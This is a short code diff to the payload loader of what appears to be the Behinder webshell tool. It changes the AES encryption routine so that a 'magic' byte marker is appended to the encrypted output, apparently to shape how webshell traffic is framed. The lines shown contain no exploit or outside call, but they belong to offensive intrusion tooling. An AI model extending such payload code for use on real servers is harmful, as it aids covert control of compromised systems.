@@ -1,5 +1,6 @@
 package net.rebeyond.behinder.payload.java;
 
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.lang.reflect.Method;
 import java.net.URL;
@@ -142,7 +143,10 @@ public class Loader {
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
-      return encrypted;
+      ByteArrayOutputStream bos = new ByteArrayOutputStream();
+      bos.write(encrypted);
+      bos.write(this.getMagic());
+      return bos.toByteArray();
    }
 
    private void fillContext(Object obj) throws Exception {
